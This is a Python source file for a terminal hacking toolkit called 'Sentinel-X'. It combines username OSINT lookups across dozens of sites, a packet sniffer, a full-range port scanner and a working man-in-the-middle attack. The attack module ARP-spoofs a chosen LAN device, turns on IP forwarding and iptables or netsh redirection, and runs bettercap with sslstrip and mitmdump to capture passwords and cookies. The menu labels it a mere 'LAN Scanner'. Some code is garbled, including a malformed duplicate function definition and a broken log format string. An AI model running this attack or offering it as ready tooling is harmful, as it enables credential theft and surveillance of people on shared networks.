import sys
import time
import socket
import threading
import requests
import ssl
import os
import platform
import random
from datetime import datetime
from colorama import Fore, Back, Style, init
import pyttsx3
import subprocess
import shutil
import signal

IS_WINDOWS = os.name == 'nt'

try:
    from scapy.all import ARP, Ether, srp, conf, get_if_list, sniff
    conf.verb = 0 
    SCAPY_AVAILABLE = True
except ImportError:
    SCAPY_AVAILABLE = False
init(autoreset=True)
engine = pyttsx3.init()
engine.setProperty('rate', 160) 
engine.setProperty('volume', 1.0)

def speak(text):
    try:
        engine.say(text)
        engine.runAndWait()
    except: pass

def log(text, level="INFO"):
    t = datetime.now().strftime("%H:%M:%S")
    colors = {"INFO": Fore.CYAN, "SUCCESS": Fore.GREEN, "ALERT": Fore.RED, "WARN": Fore.YELLOW}
    print(f"{Fore.WHITE}[{t}] [colors{level}[{level}] {Fore.WHITE}{text}]")
    return

def banner():
    os.system('cls' if os.name == 'nt' else 'clear')
    logo = r"""
    ███████╗███████╗███╗   ██╗████████╗██╗███╗   ██╗███████╗██╗          ██╗  ██╗
    ██╔════╝██╔════╝████╗  ██║╚══██╔══╝██║████╗  ██║██╔════╝██║          ╚██╗██╔╝
    ███████╗█████╗  ██╔██╗ ██║   ██║   ██║██╔██╗ ██║█████╗  ██║           ╚███╔╝ 
    ╚════██║██╔══╝  ██║╚██╗██║   ██║   ██║██║╚██╗██║██╔══╝  ██║           ██╔██╗ 
    ███████║███████╗██║ ╚████║   ██║   ██║██║ ╚████║███████╗███████╗██╗ ██╔╝  ██╗
    ╚══════╝╚══════╝╚═╝  ╚═══╝   ╚═╝   ╚═╝╚═╝  ╚═══╝╚══════╝╚══════╝╚═╝ ╚═╝   ╚═╝
                                [ Powered by: CyberOps ]
    """
    print(Fore.CYAN + Style.BRIGHT + logo)
    speak("Sentinel X interface loaded.")

# --------------------------------------------------- 1. REAL OSINT TRACKER  ---------------------------------------------------------------------
def osint_tracker():
    speak("Global OSINT Tracker initialized.")
    target = input(Fore.WHITE + "\nroot@sentinel:~/osint# Target Username: ")
    
    print(Fore.CYAN + "\n[*] Initializing Search Threads for 30+ Platforms...")
    print(Fore.CYAN + "[*] Please wait, checking databases...\n")
    
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'
    }

    sites = {
        "GitHub": f"https://github.com/{target}",
        "Instagram": f"https://www.instagram.com/{target}",
        "Facebook": f"https://www.facebook.com/{target}",
        "Twitter": f"https://www.twitter.com/{target}",
        "YouTube": f"https://www.youtube.com/{target}",
        "Blogger": f"https://{target}.blogspot.com",
        "GooglePlus": f"https://plus.google.com/+{target}/posts",
        "Reddit": f"https://www.reddit.com/user/{target}",
        "Wordpress": f"https://{target}.wordpress.com",
        "Pinterest": f"https://www.pinterest.com/{target}",
        "Github": f"https://www.github.com/{target}",
        "Tumblr": f"https://{target}.tumblr.com",
        "Flickr": f"https://www.flickr.com/photos/{target}",
        "Steam": f"https://steamcommunity.com/id/{target}",
        "Vimeo": f"https://vimeo.com/{target}",
        "SoundCloud": f"https://soundcloud.com/{target}",
        "Disqus": f"https://disqus.com/{target}",
        "Medium": f"https://medium.com/@{target}",
        "DeviantART": f"https://{target}.deviantart.com",
        "VK": f"https://vk.com/{target}",
        "About.me": f"https://about.me/{target}",
        "Spotify": f"http://googleusercontent.com/spotify.com/{target}",
        "MixCloud": f"https://www.mixcloud.com/{target}",
        "Scribd": f"https://www.scribd.com/{target}",
        "Badoo": f"https://www.badoo.com/en/{target}",
        "Patreon": f"https://www.patreon.com/{target}",
        "BitBucket": f"https://bitbucket.org/{target}",
        "CashMe": f"https://cash.me/{target}",
        "Behance": f"https://www.behance.net/{target}",
        "GoodReads": f"https://www.goodreads.com/{target}",
        "Instructables": f"https://www.instructables.com/member/{target}",
        "Keybase": f"https://keybase.io/{target}",
        "Kongregate": f"https://kongregate.com/accounts/{target}",
        "LiveJournal": f"https://{target}.livejournal.com",
        "AngelList": f"https://angel.co/{target}",
        "last.fm": f"https://last.fm/user/{target}",
        "Dribbble": f"https://dribbble.com/{target}",
        "Codecademy": f"https://www.codecademy.com/{target}",
        "Gravatar": f"https://en.gravatar.com/{target}",
        "Pastebin": f"https://pastebin.com/u/{target}",
        "Foursquare": f"https://foursquare.com/{target}",
        "Roblox": f"https://www.roblox.com/user.aspx?username={target}",
        "Gumroad": f"https://www.gumroad.com/{target}",
        "Newgrounds": f"https://{target}.newgrounds.com",
        "Wattpad": f"https://www.wattpad.com/user/{target}",
        "Canva": f"https://www.canva.com/{target}",
        "CreativeMarket": f"https://creativemarket.com/{target}",
        "Trakt": f"https://www.trakt.tv/users/{target}",
        "500px": f"https://500px.com/{target}",
        "Buzzfeed": f"https://buzzfeed.com/{target}",
        "TripAdvisor": f"https://tripadvisor.com/members/{target}",
        "HubPages": f"https://{target}.hubpages.com/",
        "Contently": f"https://{target}.contently.com",
        "Houzz": f"https://houzz.com/user/{target}",
        "blip.fm": f"https://blip.fm/{target}",
        "Wikipedia": f"https://www.wikipedia.org/wiki/User:{target}",
        "HackerNews": f"https://news.ycombinator.com/user?id={target}",
        "CodeMentor": f"https://www.codementor.io/{target}",
        "ReverbNation": f"https://www.reverbnation.com/{target}",
        "Designspiration": f"https://www.designspiration.net/{target}",
        "Bandcamp": f"https://www.bandcamp.com/{target}",
        "ColourLovers": f"https://www.colourlovers.com/love/{target}",
        "IFTTT": f"https://www.ifttt.com/p/{target}",
        "Ebay": f"https://www.ebay.com/usr/{target}",
        "Slack": f"https://{target}.slack.com",
        "OkCupid": f"https://www.okcupid.com/profile/{target}",
        "Trip": f"https://www.trip.skyscanner.com/user/{target}",
        "Ello": f"https://ello.co/{target}",
        "Tracky": f"https://tracky.com/~{target}",
        "Tripit": f"https://www.tripit.com/people/{target}#/profile/basic-info",
        "Basecamp": f"https://{target}.basecamphq.com/login",
        "BugCrowd": f"https://bugbrowd.com/h/{target}",
        "Hackerone": f"https://hackerone.com/profile/{target}"
    }

    try:
        found_list = []

        def check_site(site, url):
            try:
                r = requests.get(url, headers=headers, timeout=5)
                if r.status_code == 200:
                    print(Fore.GREEN + f"[+] DETECTED: {site:<15} -> {url}")
                    found_list.append(site)
                elif r.status_code == 404:
                    pass
            except:
                pass
        threads = []
        for site, url in sites.items():
            t = threading.Thread(target=check_site, args=(site, url))
            threads.append(t)
            t.start()
        
        for t in threads: t.join()

        print(Fore.CYAN + "----------------------------------------------------")
        if found_list:
            speak(f"Scan complete. Found {len(found_list)} accounts.")
            print(Fore.YELLOW + f"[*] SUMMARY: Target found on {len(found_list)} platforms.")
        else:
            speak("No accounts found.")
            print(Fore.RED + "[!] No matches found. Target may be using privacy settings.")
        
        input("Press ENTER to return to Sentinel-X Menu...")
    except KeyboardInterrupt:
        print("returning to Sentinel-X Menu...")
        time.sleep(2)
        return
    except Exception as e:
        print(e)
        return

# --- 2. REAL PHISHING DETECTOR ---
def phishing_check():
    speak("Phishing Detector active.")
    url = input(Fore.WHITE + "\nroot@sentinel:~/phish# Enter URL: ")
    if not url.startswith("http"): url = "https://" + url

    try:
        r = requests.get(url, timeout=5)
        if len(r.history) > 0:
            log(f"Redirect Chain Detected ({len(r.history)} hops)", "WARN")
            for resp in r.history:
                print(Fore.YELLOW + f"    -> {resp.url} [{resp.status_code}]")
        
        hostname = url.split("//")[-1].split("/")[0]
        context = ssl.create_default_context()
        with socket.create_connection((hostname, 443)) as sock:
            with context.wrap_socket(sock, server_hostname=hostname) as ssock:
                cert = ssock.getpeercert()
                print(Fore.GREEN + f"[+] SSL VALID: {cert['issuer'][1][0][1]}")
                print(Fore.GREEN + f"[+] EXPIRES  : {cert['notAfter']}")
                speak("Site certificate is valid.")

    except Exception as e:
        print(Fore.RED + f"[!] SECURITY ALERT: {e}")

    input("Press ENTER to return to Sentinel-X Menu...")

# ------------------------------------------------------ 3. REAL WEB RECON -----------------------------------------------------------------
def web_pentest():
    speak("Web Recon initiated.")
    speak("Web Reconnaissance Mode.")
    speak("Engaging Advanced Web Reconnaissance Module.")
    print(Fore.CYAN + "\n[*] LOADING EXTERNAL MODULE: RECON.PY ...")
    time.sleep(1)
    
    try:
        # Run recon.py and wait untill it completes its work
        subprocess.run([sys.executable, "recon.py"]) 
        
    except FileNotFoundError:
        print(Fore.RED + "\n[!] CRITICAL ERROR: 'recon.py' not found in the same directory!")
        speak("Error. Recon module missing.")
    
    except KeyboardInterrupt:
        print(Fore.YELLOW + "\n[!] Module execution interrupted by user.")
        
    except Exception as e:
        print(Fore.RED + f"\n[!] UNEXPECTED ERROR: {e}")
        
    
    # Return To Main File
    print(Fore.GREEN + "\n[*] RETURNING TO SENTINEL-X KERNEL...")
    time.sleep(1)
    speak("Web recon module deactivated. Returning to main menu.")

# --------------------------------------------------------------------- 4. REAL NETWORK SNIFFER (SCAPY) -----------------------------------------------------------
def network_sniffer():
    if not SCAPY_AVAILABLE:
        log("Scapy not installed. Run 'pip install scapy'.", "ERROR"); return

    speak("Sniffer activated. Capturing packets.")
    print(Fore.CYAN + "\n[*] INTERCEPTING TRAFFIC (CTRL+C to Stop)...")
    
    def packet_callback(packet):
        if packet.haslayer(ARP):
            print(Fore.MAGENTA + f"[ARP] Who has {packet[ARP].pdst}? Tell {packet[ARP].psrc}")
        elif packet.haslayer(p := "TCP") or packet.haslayer(p := "UDP"):
            ip = packet["IP"]
            print(Fore.GREEN + f"[{p}] {ip.src} -> {ip.dst} : {len(packet)} bytes")

    try:
        sniff(prn=packet_callback, count=25)
        speak("Capture buffer full. Stopping.")
    except PermissionError:
        log("Run as Administrator to sniff packets!", "ERROR")
    
    input("Press ENTER to return to Sentinel-X Menu...")

# ------------------------------------------------------------------- 5. REAL ARP NETWORK SCANNER (Replaces Fake MITM) ----------------------------------------------------
## --- CORE UTILITY: TOOL CHECK ---
def check_dependencies():IS_WINDOWS = os.name == 'nt'

def check_dependencies():
    # Adjusted list based on OS because 'iptables' does not exist on Windows
    if IS_WINDOWS:
        essential_tools = ["bettercap", "mitmdump"] 
    else:
        essential_tools = ["bettercap", "mitmdump", "iptables"]
        
    missing = [tool for tool in essential_tools if not shutil.which(tool)]
    return missing

def get_local_ip():
    # Cross-platform method to get local IP
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try:
        s.connect(('10.255.255.255', 1))
        IP = s.getsockname()[0]
    except Exception:
        IP = '127.0.0.1'
    finally:
        s.close()
    return IP

def enable_ip_forwarding(enable=True):
    if IS_WINDOWS:
        # Powershell command for Windows
        state = "Enabled" if enable else "Disabled"
        subprocess.run(["powershell", f"Set-NetIPInterface -Forwarding {state}"], capture_output=True)
    else:
        # Sysctl for Linux
        val = "1" if enable else "0"
        os.system(f"echo {val} > /proc/sys/net/ipv4/ip_forward")

def set_port_redirection(interface, local_ip, enable=True):
    if IS_WINDOWS:
        if enable:
            # Netsh portproxy for Windows (Redirect 80/443 -> 8080)
            os.system(f"netsh interface portproxy add v4tov4 listenport=80 connectaddress={local_ip} connectport=8080")
            os.system(f"netsh interface portproxy add v4tov4 listenport=443 connectaddress={local_ip} connectport=8080")
        else:
            # Reset netsh
            os.system("netsh interface portproxy reset")
    else:
        if enable:
            # Iptables for Linux
            os.system("iptables -t nat -F")
            os.system(f"iptables -t nat -A PREROUTING -i {interface} -p tcp --dport 80 -j REDIRECT --to-port 8080")
            os.system(f"iptables -t nat -A PREROUTING -i {interface} -p tcp --dport 443 -j REDIRECT --to-port 8080")
        else:
            # Flush iptables
            os.system("iptables -t nat -F")

def mitm_simulation():
    # 1. Check Dependencies
    missing = check_dependencies()
    if missing:
        log(f"Missing tools: {', '.join(missing)}. Install them first!", "ALERT")
        input("Press ENTER to return to Sentinel-X Menu...")
        return

    os.system('cls' if IS_WINDOWS else 'clear')

    print(f"{Fore.RED}{Style.BRIGHT}" + "═"*65)
    print(f"{Fore.WHITE}   SENTINEL-X ELITE   |   INTERNAL NETWORK EXPLOITATION V3.0")
    print(f"{Fore.RED}" + "═"*65)

    try:
        # 2. Interface Selection (Cross-Platform)
        if IS_WINDOWS:
            from scapy.arch.windows import get_windows_if_list
            win_ifaces = get_windows_if_list()
            ifaces = [i['name'] for i in win_ifaces] # Use GUID/Name
            display_names = [i['description'] for i in win_ifaces]
        else:
            ifaces = os.listdir('/sys/class/net/')
            display_names = ifaces

        print(f"{Fore.YELLOW}[*] Available Interfaces:")
        for i, name in enumerate(display_names):
            print(f"    {Fore.CYAN}[{i}] {Fore.WHITE}{name}")
        
        if_choice = int(input(f"\n{Fore.YELLOW}Select Interface ID: {Fore.WHITE}"))
        interface = ifaces[if_choice] # Actual interface name/GUID used by OS

        # 3. Network Scanning
        log(f"Broadcasting ARP on {interface}...", "INFO")
        
        local_ip = get_local_ip()
        net_prefix = ".".join(local_ip.split(".")[:-1]) + ".0/24"
        
        print(f"{Fore.CYAN}[?] Scanning default range: {net_prefix}")
        
        # Scapy Scan
        conf.verb = 0
        ans, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=net_prefix), timeout=3, iface=interface, verbose=False)
        
        devices = []
        print(f"\n{Fore.MAGENTA}ID\tIP ADDRESS\t\tMAC ADDRESS")
        for i, (s, r) in enumerate(ans):
            devices.append(r.psrc)
            print(f"{Fore.GREEN}{i}\t{r.psrc:<15}\t{Fore.WHITE}{r.hwsrc}")
        
        if not devices:
            log("No devices found. Exiting.", "ALERT"); return

        target_idx = int(input(f"\n{Fore.YELLOW}Ctrl + C to leave OR Select Target ID: {Fore.WHITE}"))
        target_ip = devices[target_idx]
        gateway_ip = input(f"{Fore.YELLOW}Enter Gateway IP: {Fore.WHITE}")

    except KeyboardInterrupt:
        print("returning to Sentinel-X Menu...")
        time.sleep(2)
        return
    except Exception as e:
        log(f"Setup Error: {e}", "ERROR")
        time.sleep(3)
        return

    # 4. Setup Logging
    log_folder = "sentinel_vault"
    if not os.path.exists(log_folder): os.makedirs(log_folder)
    
    session_id = datetime.now().strftime("%H%M%S")
    pcap_out = f"{log_folder}/session_{session_id}.pcap"
    
    try:
        speak("Initializing elite interception engines.")
        log("Hardening Network Configuration...", "INFO")
        
        # 5. Enable Forwarding & Redirect Traffic (OS Specific)
        enable_ip_forwarding(True)
        set_port_redirection(interface, local_ip, True)

        # 6. Launch MITM Tools
        # mitmdump command
        mitm_cmd = ["mitmdump", "--mode", "transparent", "--save-stream", pcap_out]
        # Windows often requires socks mode or specific config, but keeping transparent as requested
        
        mitm_proc = subprocess.Popen(
            mitm_cmd,
            stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
        )

        # Bettercap command
        better_cmd = [
            "bettercap", "-iface", interface, "-eval", 
            f"set arp.spoof.targets {target_ip}; set http.proxy.sslstrip true; arp.spoof on; net.sniff on"
        ]
        better_proc = subprocess.Popen(better_cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

        time.sleep(3)

        # 7. Dashboard UI
        os.system('cls' if IS_WINDOWS else 'clear')
        print(f"{Fore.RED}{Style.BRIGHT}" + "═"*65)
        print(f"{Fore.WHITE}   STRIKE STATUS: {Fore.GREEN}RUNNING")
        print(f"{Fore.RED}" + "═"*65)
        print(f"{Fore.YELLOW} TARGET   : {Fore.WHITE}{target_ip}")
        print(f"{Fore.YELLOW} INTERFACE: {Fore.WHITE}{interface}")
        print(f"{Fore.YELLOW} VAULT    : {Fore.WHITE}{pcap_out}")
        print(f"{Fore.YELLOW} SSLSTRIP : {Fore.GREEN}ENABLED")
        print(f"{Fore.RED}" + "═"*65)
        
        print(f"\n{Fore.CYAN}[*] Sentinel-X is now a bridge between Target and Router.")
        print(f"{Fore.WHITE}[!] Monitoring for Clear-text Passwords & Cookies...")
        print(f"{Fore.RED}[!] Press CTRL+C to Safely Stop and Save Data.")

        while True:
            if mitm_proc.poll() is not None or better_proc.poll() is not None:
                log("One of the engines crashed! Emergency exit.", "ALERT")
                break

            for dot in [".  ", ".. ", "..."]:
                print(f"{Fore.MAGENTA}\r[+] SNIFFING{dot}", end="")
                time.sleep(0.5)

    except KeyboardInterrupt:
        print(f"\n\n{Fore.YELLOW}[!] TERMINATION SIGNAL RECEIVED.")

        # 8. Cleanup
        # Send SIGINT (CTRL+C)
        if IS_WINDOWS:
             # Windows doesn't handle SIGINT to subprocesses well, using terminate
            better_proc.terminate()
            mitm_proc.terminate()
        else:
            better_proc.send_signal(signal.SIGINT)
            mitm_proc.send_signal(signal.SIGINT)
        
        time.sleep(2)
        
        # Force kill if still running
        if better_proc.poll() is None: better_proc.terminate()
        if mitm_proc.poll() is None: mitm_proc.terminate()

        log("Restoring Network Settings...", "INFO")
        
        # Restore Network Tables
        set_port_redirection(interface, local_ip, False)
        enable_ip_forwarding(False)
        
        print(f"\n{Fore.GREEN}╔═══════════════════════════════════════════════════════╗")
        print(f"║ {Fore.WHITE}SESSION ARCHIVED: {pcap_out:<33} ║")
        print(f"║ {Fore.WHITE}STATUS: All background rules cleared.                 ║")
        print(f"╚═══════════════════════════════════════════════════════╝")
        
        speak("Interception successful. Data archived in vault.")
        time.sleep(3)
        banner() 
        input("Press ENTER to return to Sentinel-X Menu...")  
    except:
         input("Press ENTER to return to Sentinel-X Menu...")  
         return
    input("Press ENTER to return to Sentinel-X Menu...")
# ---------------------------------------------------------------- 6. REAL MULTI-THREADED PORT SCANNER --------------------------------------------------------------
def port_scanner():
    import socket
    import sys
    import threading
    from datetime import datetime
    from concurrent.futures import ThreadPoolExecutor
    try:
        from colorama import Fore, Style, init
        init(autoreset=True)
    except:
        pass

    # --- Banner ---
    print(Fore.RED + Style.BRIGHT + r"""
        / \__
       (    @\___   [ SYSTEM BREACH: PORT SENTRY ACTIVATED ]
       /         O  [ TARGETING: ALL PORTS (1-65535)       ]
      /   (_____/   [ MODE: AGGRESSIVE                     ]
     /_____/   U
    """)

    # --- Input ---
    try: speak("Port Scanner initialized.")
    except: pass
    target = input(Fore.WHITE + "\nroot@sentinel:~/nmap# Enter Target IP: ")
    
    # --- Scan Header ---
    start_time = datetime.now()
    print(Fore.WHITE + f"\nStarting Nmap 7.94 at {start_time.strftime('%Y-%m-%d %H:%M')}")
    print(f"Nmap scan report for {target}")
    print(Fore.YELLOW + "Scanning 65535 ports... (This will take time)")

    scanned_count = 0
    total_ports = 65535
    print_lock = threading.Lock()

    open_ports = []

    # --- Scan Logic ---
    def scan(port):
        nonlocal scanned_count
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(0.4) 
            if s.connect_ex((target, port)) == 0:
                try: service = socket.getservbyport(port)
                except: service = "unknown"
                open_ports.append({'port': port, 'service': service})
            s.close()
        except: pass

        with print_lock:
            scanned_count += 1
        
            if scanned_count % 500 == 0 or scanned_count == total_ports:
                percent = (scanned_count / total_ports) * 100
                bar_length = 40
                filled = int(bar_length * scanned_count // total_ports)
                bar = "#" * filled + "-" * (bar_length - filled)
                
                # Progress
                sys.stdout.write(f"\r{Fore.CYAN}[{bar}] {percent:.1f}%{Style.RESET_ALL}")
                sys.stdout.flush()

    # --- Multi-threading (Scanning 1-65535) ---
    with ThreadPoolExecutor(max_workers=500) as executor:
        executor.map(scan, range(1, 65536))

    # --- Output ---
    open_ports.sort(key=lambda x: x['port'])
    sys.stdout.write("\r" + " "*60 + "\r") # Clear loading line

    if open_ports:
        print(Fore.WHITE + "PORT".ljust(10) + "STATE".ljust(10) + "SERVICE")
        for item in open_ports:
            print(Fore.GREEN + f"{item['port']}/tcp".ljust(10) + "open".ljust(10) + item['service'])
    else:
        print(Fore.RED + "All 65535 ports are closed/filtered.")

    # --- Footer ---
    duration = (datetime.now() - start_time).total_seconds()
    print(Fore.WHITE + f"\nNmap done: 1 IP address scanned in {duration:.2f} seconds")
    
    try: speak("Scan completed.")
    except: pass
    input("\nPress Enter to return...")

# ---------------------------------------------------------------- 6. System Moniter --------------------------------------------------------------

def system_moniter():
    
    # Launches the external System Integrity Monitor script.
    
    print(f"\n{Fore.CYAN}[*] INITIALIZING SUB-SYSTEM LINK...{Style.RESET_ALL}")
      
    target_file = "moniter.py" 
    
    # Check if file exists
    if not os.path.exists(target_file):
        print(f"{Fore.RED}[!] ERROR: TARGET MODULE '{target_file}' NOT FOUND.{Style.RESET_ALL}")
        return

    try:
        subprocess.run([sys.executable, target_file])
    except KeyboardInterrupt:
        print(f"\n{Fore.YELLOW}[!] MODULE TERMINATED BY USER.{Style.RESET_ALL}")
    except Exception as e:
        print(f"{Fore.RED}[!] EXECUTION FAILED: {e}{Style.RESET_ALL}")


def main():
    
    while True:
        banner()
        print(Fore.MAGENTA + "\n--- [ SENTINEL-X COMMAND MENU ] ---")
        print(Fore.YELLOW + "1. OSINT Tracker       " + Fore.WHITE + "(Real Profile Search)")
        print(Fore.YELLOW + "2. Phishing Detector   " + Fore.WHITE + "(SSL & Redirect Analysis)")
        print(Fore.YELLOW + "3. Web Recon           " + Fore.WHITE + "(Headers & Admin Finder)")
        print(Fore.YELLOW + "4. Network Sniffer     " + Fore.WHITE + "(Live Packet Capture)")
        print(Fore.YELLOW + "5. LAN Scanner (MitM)  " + Fore.WHITE + "(ARP Device Discovery)")
        print(Fore.YELLOW + "6. Port Scanner        " + Fore.WHITE + "(Multi-threaded)")
        print(Fore.YELLOW + "7. System Moniter      " + Fore.WHITE + "(Host Defense & Integrity Audit)")
        print(Fore.YELLOW + "8. Exit")
        
        choice = input(Fore.RED + "\nroot@sentinel:~# ")
        
        if choice == '1': osint_tracker()
        elif choice == '2': phishing_check()
        elif choice == '3': web_pentest()
        elif choice == '4': network_sniffer()
        elif choice == '5': mitm_simulation()
        elif choice == '6': port_scanner()
        elif choice == '7': system_moniter()
        elif choice == '8': 
            speak("System shutting down.")
            sys.exit()
        else:
            print(Fore.RED + "Invalid Option.")

if __name__ == "__main__": 
    main()



